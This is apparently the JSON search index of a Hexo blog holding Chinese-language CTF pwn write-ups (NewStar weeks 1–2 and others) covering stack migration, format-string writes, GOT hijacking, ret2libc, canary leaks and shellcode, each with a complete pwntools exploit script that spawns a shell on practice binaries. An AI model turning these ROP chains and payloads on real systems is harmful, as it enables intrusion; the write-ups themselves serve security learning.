{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"所有分类","date":"2024-08-19T15:42:49.874Z","updated":"2024-08-19T15:42:49.874Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2024-08-19T15:42:32.305Z","updated":"2024-08-19T15:42:32.305Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"下面写关于自己的内容"},{"title":"所有标签","date":"2024-08-19T15:43:06.451Z","updated":"2024-08-19T15:43:06.451Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2024-08-19T15:43:46.641Z","updated":"2024-08-19T15:43:46.641Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。 这里可以写友链页面下方的文字备注，例如自己的友链规范、示例等。"}],"posts":[{"title":"Hello Hnu！","slug":"栈迁移","date":"2024-09-04T07:46:25.049Z","updated":"2024-09-04T08:45:17.571Z","comments":true,"path":"2024/09/04/栈迁移/","permalink":"http://example.com/2024/09/04/%E6%A0%88%E8%BF%81%E7%A7%BB/","excerpt":"","text":"栈迁移当可操控的栈空间不多时可以尝试 原理在x64架构下，栈空间通过rsp和rbp寄存器进行标识，在函数执行的开始时，会执行call指令，在函数结束时，会执行leave ret返回 12345678910111213141516函数调用时栈空间操作的最基本情况 -&gt; 函数调用：callmov %rsp,%rbppush %eip# 函数返回地址压入栈内，此时rsp自动减去0x8push %rbp # 保存父函数栈底指针到栈内，此时rsp自动减去0x8mov %rsp,$rbp # 设置被调用函数的栈底指针sub xxx,%rsp # 分配栈空间 leave # 相当于下方指令进行的操作 mov %rbp,%rsp; ## 释放之前分配的栈空间 pop %rbp ## 从栈上取出之前保存的父函数栈底指针到rbp，此时rsp自动加上0x8ret pop %eip# 从栈上取出返回地址，然后返回，此时rsp自动加上0x8 栈迁移如何进行想要把栈空间迁移到指定的位置，核心的原理就是修改rsp和rbp寄存器的数值，让它们指向我们期望中的位置。 首先，我们需要在搞清楚输入的数据位于栈内的地址，接着我们可以往栈内填入需要的内容，例如pop_rdi，ret，等的地址来构造shellcode，再补全payload直至rbp的位置，往rep里填入需要返回的地址back_addr-0x8（32位加上0x4，后面会清楚为什么的），在函数返回地址的空间内填入leave_ret_addr，当函数执行结束时，首先会执行mov rsp,rbp，将栈顶和栈底放置于同一个位置，pop rbp，此时ebp会返回我们已经填入返回地址back_addr-0x8，pop rip，此时rip会指向leave_ret_addr，随后再次执行leave ret, mov rsp,rbp,将栈顶和栈底放置于同一个位置,pop rbp,此时rsp会自动加0x8，到达back_addr，pop rip,接着执行我们填入的东西，到这里栈迁移的过程已经差不多结束了。 接下来进入实战 stack migration 来自newstar week2，可以自己去buuctf自行下载 如题，栈迁移，做题前自己去了解了以下，打算把自己的理解写出来，详见我的博客cwj-happy.github.io 拿到题先checksec一下，看看开了什么保护 没开pie，给了libc文件，很明显的提示，进ida反编译验证一下猜想 给了buf的地址，v2可以栈溢出，但没给足够的空间，这里可以想到用栈迁移实现变相拉大溢出空间的效果，然后通过泄露puts_got表地址，找到libc基地址，加上偏移找到system地址和bin&#x2F;sh地址，填入栈空间，最终得到shell 这里先随意输个字符，通过第一个read，接收buf地址，接着构造payload泄露puts_got表地址 拿到puts_got表地址，接着就是正常ret2libc，重复和上面的操作即可拿到shell 这里其实可以直接用buf 的地址算出libc基地址，简便很多，详情见官方write up 以下是完整exp 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *#from LibcSearcher import LibcSearcherfilename=&#x27;./stack&#x27;elf = ELF(filename)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)#p=remote(&#x27;node5.buuoj.cn&#x27;,27127)p=process(filename)libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)pop_rdi=0x401333ret=0x40101aleave=0x4012aamain=0x4011fbputs_got=elf.got[&#x27;puts&#x27;]puts_plt=elf.plt[&#x27;puts&#x27;]p.sendlineafter(&#x27;name:\\n&#x27;,b&#x27;a&#x27;*0x1)p.recvuntil(b&#x27;you: &#x27;)buf=int(p.recv(14),16)+8print(hex(buf))payload=p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)payload=payload.ljust(80,b&#x27;a&#x27;)+p64(buf)+p64(leave)p.sendafter(&quot;more infomation plz:\\n&quot;,payload)#p.recvuntil(b&#x27;plz:&#x27;)#p.sendline(payload)p.recvuntil(&#x27;soon!\\n&#x27;)puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))libc_base=puts_addr-libc.sym[&#x27;puts&#x27;]sys=libc_base+libc.sym[&#x27;system&#x27;]bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))p.sendlineafter(&#x27;name:\\n&#x27;,b&#x27;a&#x27;*0x7)p.recvuntil(b&#x27;you: &#x27;)buf=int(p.recv(14),16)+8payload1=b&#x27;a&#x27;*0x8+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys)payload1=payload1.ljust(0x50,b&#x27;a&#x27;)payload1+=p64(buf)+p64(leave)p.sendafter(&quot;more infomation plz:\\n&quot;,payload1)p.interactive()","categories":[{"name":"知识分享","slug":"知识分享","permalink":"http://example.com/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"知识分享","slug":"知识分享","permalink":"http://example.com/tags/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/"}]},{"title":"iamorange--fmt2/got-it","slug":"iamorange--fmt2__got-it","date":"2024-09-02T07:14:02.205Z","updated":"2024-09-04T02:56:32.861Z","comments":true,"path":"2024/09/02/iamorange--fmt2__got-it/","permalink":"http://example.com/2024/09/02/iamorange--fmt2__got-it/","excerpt":"","text":"fmt2checksec一下，开了pie保护，nx保护运行一遍瞧瞧，有格式化字符串漏洞丢ida里反编译看看，可以看到，当参数a等于’deadeef’,就可以执行sys，看看a的位置吧进gdb调试一下吧，可以看到main的地址存放在栈中，可利用格式化字符串漏洞泄露出main 的地址，计算出基地址，加上参数a的偏移量，就可以获取参数a的真实地址，再利用利用格式化字符串漏洞往里写入’deadbeef’，即可通过判断，执行sys以下是exp 123456789101112131415161718192021222324252627282930from pwn import *#from LibcSearcher import *filename=&#x27;./fmt2&#x27;elf = ELF(filename)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)#p=remote(&#x27;boom.01130328.xyz&#x27;,36903)p=process(filename)pie=0x0000000000004048p.recvuntil(&#x27;Input your content: &#x27;)p.send(b&#x27;%41$p&#x27;)main_addr = int(p.recv(14),16)print(hex(main_addr))elf_addr=main_addr-elf.sym[&#x27;main&#x27;]a_addr=elf_addr+piepayload = b&quot;%239c%8$hhn&quot;.ljust(16,b&#x27;a&#x27;)+p64(a_addr) #\\xefp.sendlineafter(b&#x27;content: &#x27;,payload)payload = b&quot;%190c%8$hhn&quot;.ljust(16,b&#x27;a&#x27;)+p64(a_addr+1) #\\xbep.sendlineafter(b&#x27;content: &#x27;,payload)payload = b&quot;%173c%8$hhn&quot;.ljust(16,b&#x27;a&#x27;)+p64(a_addr+2) #\\adp.sendlineafter(b&#x27;content: &#x27;,payload)payload = b&quot;%222c%8$hhn&quot;.ljust(16,b&#x27;a&#x27;)+p64(a_addr+3) #\\xdep.sendlineafter(b&#x27;content: &#x27;,payload)p.interactive() got-itgot表劫持漏洞，checksec一下，partial relro，可以修改plt&#x2F;got表进ida反编译看看，点进各个函数看看可以通过输入，将v1赋值负数，实现数组越界，edit函数可以对其实现修改，show函数可以泄露其地址，trick函数中exit()函数的参数正好为binsh，将exit_got地址改为system，执行exit即可拿到控制权计算出puts_got地址距离list为0x88 当v1为-17时，即可到达puts_got表地址，通过show函数泄露puts_got地址，算出libc基地址，通过计算sys_addr&#x3D;libc_base+elf.sym[‘system’]拿到system地址，通过计算，exit距list 0x58 当v1为-8时即可到达exit地址，通过edit函数，将exit地址改为system，最后运行trick函数即可以下是exp有个小问题，这里附件给的libc文件应该是远端用给的，程序跑在本地应该用本地的libc，跑起来正如我所料 123456789101112131415161718192021222324252627282930from pwn import *#from LibcSearcher import *filename=&#x27;./got-it&#x27;elf = ELF(filename)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)#p=remote(&#x27;boom.01130328.xyz&#x27;,36903)p=process(filename)elf=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)p.recvuntil(&quot;&gt;&gt; &quot;)p.sendline(b&#x27;2&#x27;)p.sendlineafter(&quot;Input student id: &quot;,b&#x27;-17&#x27;)puts_addr=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))#pause()libc_base=puts_addr-elf.sym[&#x27;puts&#x27;]sys_addr=libc_base+elf.sym[&#x27;system&#x27;]print(hex(sys_addr))p.recvuntil(&quot;&gt;&gt; &quot;)p.sendline(b&#x27;1&#x27;)p.sendlineafter(&quot;Input student id: &quot;,b&#x27;-11&#x27;)p.sendlineafter(&quot;Input student name: &quot;,p64(sys_addr))p.recvuntil(&quot;&gt;&gt; &quot;)p.sendline(b&#x27;8227&#x27;)p.interactive()","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"复现","slug":"复现","permalink":"http://example.com/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"write up","slug":"write-up","permalink":"http://example.com/tags/write-up/"}]},{"title":"Newstar_week2","slug":"Newstar_week2","date":"2024-09-01T08:32:10.107Z","updated":"2024-09-04T02:56:17.999Z","comments":true,"path":"2024/09/01/Newstar_week2/","permalink":"http://example.com/2024/09/01/Newstar_week2/","excerpt":"","text":"Newstar_week2ret2libc简单的看看开了什么保护吧，没开pie 运行一下看看 丢ida里反编译看看，可以栈溢出，很普通的ret2libc 以下是exp 1234567891011121314151617181920212223242526272829303132from pwn import *from LibcSearcher import LibcSearcherelf = ELF(&#x27;./ret2libc&#x27;)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)p=remote(&#x27;node5.buuoj.cn&#x27;,27127)#p=process(&#x27;./ret2libc&#x27;)ret_addr = 0x400506main_addr=0x400698pop_rdi_ret = 0x400763 puts_got=elf.got[&#x27;puts&#x27;]puts_plt=elf.plt[&#x27;puts&#x27;]padding = b&#x27;a&#x27;*(0x20+8)#io = remote(&quot;node4.anna.nssctf.cn&quot;,28729)payload = padding+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)#payload = flat([padding, pop_rdi_ret, elf.got[&#x27;puts&#x27;], elf.plt[&#x27;puts&#x27;], main_addr])p.recvuntil(&#x27;again&#x27;)p.sendline(payload)#puts_addr = int(unpack(p.recvuntil(&#x27;\\n&#x27;,drop=True).ljust(8,b&#x27;\\x00&#x27;)))#puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))puts_addr=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)str_bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload2 = padding+p64(ret_addr)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)p.sendafter(b&#x27;again\\n&#x27;,payload2)p.interactive() secretnumberchecksec看看，开了全保护 运行一下进ida里反编译看看 出现了格式化字符漏洞，gdb调试一下看看，看到了main的地址，通过计算得到基地址，所以我们的思路就得到了，修改secret的值，通过格式化字符串泄露出main的地址，然后通过计算得出基地址，基地址加上偏移量得到secret的地址，再通过格式化字符串写入 以下是exp 1234567891011121314151617181920212223242526272829from ctypes import *from pwn import * #clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#p=process(&#x27;./secretnumber&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28891)context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;) p.recvuntil(&#x27;Give me some gift?(0/1)&#x27;)p.sendline(b&#x27;1&#x27;)p.recvuntil(&#x27;it&#x27;)p.sendline(b&#x27;aaaaaaaa%17$p&#x27;)p.recvuntil(&#x27;aaaaaaaa&#x27;) main_addr=int(p.recvuntil(&#x27;f5&#x27;)[-12:],16)real = main_addr-0x12F5+0x404cprint(real)p.recvuntil(&#x27;Give me some gift?(0/1)&#x27;)p.sendline(b&#x27;1&#x27;)p.recvuntil(&#x27;it&#x27;)offset=8fmtpayload=fmtstr_payload(offset, &#123;real:1&#125;)p.sendline(fmtpayload)p.sendlineafter(&quot;(0/1)\\n&quot;,&#x27;0&#x27;) p.sendlineafter(&quot;Guess the number\\n&quot;,&#x27;1&#x27;)p.interactive() canary 这里引用ctf-wiki 开启 Canary 保护的 stack 结构大概如下： 1234567891011121314 High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp =&gt; | old ebp | +-----------------+rbp-8 =&gt; | canary value | +-----------------+ | local variables | Low | | Address 普通的canary,checksec看看保护，开了canary，没开pie 直接丢ida反编译看看什么情况，有后门函数，出现了格式化字符串漏洞，到这里大致有了点思路，通过格式化字符串泄露canary，再通过栈溢出打通 接下来gdb调试，寻找canary，可以看到canary在rbp之上，所以可以输入%11$p泄露canary 接下来就是基操了，以下是exp 1234567891011121314from pwn import *context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)p=process(&#x27;./canary&#x27;)#p = remote(&#x27;node4.buuoj.cn&#x27;,25970)p.recvuntil(&#x27;gift?\\n&#x27;)p.sendline(b&#x27;%11$p&#x27;)p.recvuntil(b&#x27;gift:\\n&#x27;)canary=int(p.recv(18),16)print(hex(canary))backdoor=0x401262payload=b&#x27;a&#x27;*(0x30-0x8)+p64(canary)+b&#x27;a&#x27;*0x8+p64(backdoor)p.recvuntil(&#x27;magic\\n&#x27;)p.sendline(payload)p.interactive() stack migration如题，栈迁移，做题前自己去了解了以下，打算把自己的理解写出来，详见我的博客cwj-happy.github.io 拿到题先checksec一下，看看开了什么保护 没开pie，给了libc文件，很明显的提示，进ida反编译验证一下猜想 给了buf的地址，v2可以栈溢出，但没给足够的空间，这里可以想到用栈迁移实现变相拉大溢出空间的效果，然后通过泄露puts_got表地址，找到libc基地址，加上偏移找到system地址和bin&#x2F;sh地址，填入栈空间，最终得到shell 这里先随意输个字符，通过第一个read，接收buf地址，接着构造payload泄露puts_got表地址 拿到puts_got表地址，接着就是正常ret2libc，重复和上面的操作即可拿到shell 这里其实可以直接用buf 的地址算出libc基地址，简便很多，详情见官方write up 以下是完整exp 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *#from LibcSearcher import LibcSearcherfilename=&#x27;./stack&#x27;elf = ELF(filename)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)#p=remote(&#x27;node5.buuoj.cn&#x27;,27127)p=process(filename)libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)pop_rdi=0x401333ret=0x40101aleave=0x4012aamain=0x4011fbputs_got=elf.got[&#x27;puts&#x27;]puts_plt=elf.plt[&#x27;puts&#x27;]p.sendlineafter(&#x27;name:\\n&#x27;,b&#x27;a&#x27;*0x1)p.recvuntil(b&#x27;you: &#x27;)buf=int(p.recv(14),16)+8print(hex(buf))payload=p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)payload=payload.ljust(80,b&#x27;a&#x27;)+p64(buf)+p64(leave)p.sendafter(&quot;more infomation plz:\\n&quot;,payload)#p.recvuntil(b&#x27;plz:&#x27;)#p.sendline(payload)p.recvuntil(&#x27;soon!\\n&#x27;)puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))libc_base=puts_addr-libc.sym[&#x27;puts&#x27;]sys=libc_base+libc.sym[&#x27;system&#x27;]bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))p.sendlineafter(&#x27;name:\\n&#x27;,b&#x27;a&#x27;*0x7)p.recvuntil(b&#x27;you: &#x27;)buf=int(p.recv(14),16)+8payload1=b&#x27;a&#x27;*0x8+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys)payload1=payload1.ljust(0x50,b&#x27;a&#x27;)payload1+=p64(buf)+p64(leave)p.sendafter(&quot;more infomation plz:\\n&quot;,payload1)p.interactive() shellcode revenge不会，等我会了，再回来写，先把官方write up贴出来、 12345678910111213141516171819202122232425262728293031from pwn import * context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;) p = remote(&quot;node4.buuoj.cn&quot;,27904) #p = process(&#x27;./shellcodere&#x27;) payload = b&#x27;\\x33\\x42\\x38&#x27; #33 42 38 xor eax, DWORD PTR [rdx+0x38] payload += b&#x27;\\x31\\x42\\x30&#x27; #31 42 30 xor DWORD PTR [rdx+0x30], eax payload += b&#x27;\\x33\\x42\\x37&#x27; #33 42 38 xor eax, DWORD PTR [rdx+0x38] payload += b&#x27;\\x31\\x42\\x38&#x27; #31 42 38 xor DWORD PTR [rdx+0x38], eax payload += b&#x27;\\x59&#x27;*(0x30-len(payload)) #59 pop rcx payload += b&#x27;\\x4e\\x44&#x27;*2 #syscall 0x4e^0x41=0xf 0x44^0x41=0x5 payload += b&#x27;A&#x27;*8 #xor key p.sendlineafter(&quot;magic\\n&quot;,payload) pause() p.sendline(b&#x27;\\x90&#x27;*0x50+asm(shellcraft.sh())) p.interactive()","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"复现","slug":"复现","permalink":"http://example.com/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"write up","slug":"write-up","permalink":"http://example.com/tags/write-up/"}]},{"title":"Newstar week1","slug":"Newstar-week1","date":"2024-08-30T01:29:50.981Z","updated":"2024-09-04T02:55:56.691Z","comments":true,"path":"2024/08/30/Newstar-week1/","permalink":"http://example.com/2024/08/30/Newstar-week1/","excerpt":"","text":"Ret2text很简单的栈溢出，checksec一下 64位，没开pie，运行一下看看没什么特殊的，直接丢ida里反编译看一眼很明显的栈溢出，溢出大小为0x20+0x8，直接开始简单的脚本攻击以下是exp 1234567891011121314151617from pwn import *#p = process([&#x27;./Ret2text&#x27;])p = remote(&#x27;node5.buuoj.cn&#x27;, 29795)#p64中输入十六进制的值，即进行变量覆写#p.recvuntil(&quot;name:\\n&quot;)#payload=b&#x27;1956681178&#x27;#p.sendline(payload)#p.recvuntil(&quot;enge\\n&quot;)system_binsh_addr=0x4011FBsh=0x08048670padding=0x20+0x8payload=b&#x27;a&#x27; * padding + p64(system_binsh_addr)p.recvuntil(&#x27;magic&#x27;)p.send(payload)#p.recv()p.interactive() ezshellcode很简单的ret2shellcode，运行一下看看先和上一题怎么一样，差点以为下错文件，checksec一下吧OK呀，直接给我打开ida反编译看看怎么回事没有后门函数，但开辟了一段可执行段，可以往可执行段里写shellcode，很不错，那就直接开始吧！以下是exp 1234567891011121314151617181920from pwn import * context (os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;140&#x27;]pwnfile = &#x27;./ezshellcode&#x27;elf = ELF(pwnfile)#libc = ELF(&#x27;&#x27;)#io = process(pwnfile)p = remote(&#x27;node5.buuoj.cn&#x27;,27667)#gdb.attach(io)pay = asm(shellcraft.sh()) #自动生成shellcode#pay = b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&#x27;#64位不可见shellcodep.recvuntil(&#x27;magic\\n&#x27;)p.send(pay) Newstart_shop整数溢出，checksec后，丢ida里反编译瞧瞧，发现是一堆的函数，点进去看看可以看到在判断的时候，是unsigned int类型，所以我们可以让money变成负数后，判断时就足够大了这个函数刚好可以做到，直接执行 p1eeechecksec一下，基本上能开的保护都开了运行一下看看运行一下也没什么东西，进ida里看看仔细看看有后门函数，正好也给了栈溢出的机会由于开了pie，基地址随机，只有后三位是固定的，所以可以通过栈溢出将返回地址后四位修改，看很多大佬的博客是通过爆破打通，这里我发现用64-68都打不通，69-6c甚至不需要爆破就能打通，由于read为程序最后一个函数，也调试不出来，希望有懂的大佬可以教教我以下是exp 12345678910111213141516171819&quot;&quot;&quot;from pwn import *p=process(&#x27;./aaa&#x27;)#p = remote(&#x27;node4.buuoj.cn&#x27;,25970)context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;) #p.sendafter(b&quot;A nice try to break pie!!!&quot;, b&#x27;\\x00&#x27;*0x28 + p8(0x6c))p.sendafter(b&quot;A nice try to break pie!!!&quot;, b&#x27;\\x00&#x27;*0x28 + b&#x27;d&#x27;)#print(p.sendline(b&#x27;cat flag&#x27;))p.interactive()&quot;&quot;&quot;from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)p=process(&#x27;./aaa&#x27;)#p=remote(&#x27;node5.buuoj.cn&#x27;,26568)payload=b&#x27;a&#x27;*(32+8)+b&#x27;\\x69&#x27;p.sendlineafter(&#x27;!&#x27;,payload)p.interactive() Randomexp 12345678910111213141516171819from ctypes import *from pwn import * clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#p=process(&#x27;./aaa&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29112)context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;) clibc.srand(clibc.time(0))v =clibc.rand() p.sendlineafter(b&quot;can you guess the number?&quot;, str(v).encode()) p.sendline(b&#x27;/bin/sh&#x27;)p.sendline(b&#x27;cat flag&#x27;) p.interactive()","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"复现","slug":"复现","permalink":"http://example.com/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"write up","slug":"write-up","permalink":"http://example.com/tags/write-up/"}]},{"title":"Hello Hnu！","slug":"PWN-orange","date":"2024-08-19T15:46:26.240Z","updated":"2024-09-03T02:43:12.182Z","comments":true,"path":"2024/08/19/PWN-orange/","permalink":"http://example.com/2024/08/19/PWN-orange/","excerpt":"","text":"netcat通过题目不难看出，nc 一下即可 shellcode拿到题目第一步 checksec 一下打开的栈不可执行，丢 ida 里看看产生了一段可执行段，进 gdb 验证一下很明显产生了一段可执行段，注意到 read 限制了输入大小，所以只能自己制作一段以下是攻击脚本from LibcSearcher import LibcSearcherfrom pwn import * context(os&#x3D;’linux’, arch&#x3D;’amd64’, log_level&#x3D;’debug’)#p&#x3D;process(‘.&#x2F;aaa’)p &#x3D; remote(‘boom.01130328.xyz’, 39095)elf &#x3D; ELF(‘.&#x2F;pwn4’)rop &#x3D; ROP(‘.&#x2F;pwn4’)shellcode &#x3D; b’\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05’sh &#x3D; asm(shellcraft.sh())p.recvuntil(‘code:’)p.send(shellcode)p.interactive()","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"write up","slug":"write-up","permalink":"http://example.com/tags/write-up/"},{"name":"比赛","slug":"比赛","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"Hello World","slug":"hello-world","date":"2024-08-19T02:51:34.469Z","updated":"2024-08-19T02:51:34.469Z","comments":true,"path":"2024/08/19/hello-world/","permalink":"http://example.com/2024/08/19/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"知识分享","slug":"知识分享","permalink":"http://example.com/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/"},{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"知识分享","slug":"知识分享","permalink":"http://example.com/tags/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/"},{"name":"复现","slug":"复现","permalink":"http://example.com/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"write up","slug":"write-up","permalink":"http://example.com/tags/write-up/"},{"name":"比赛","slug":"比赛","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"}]}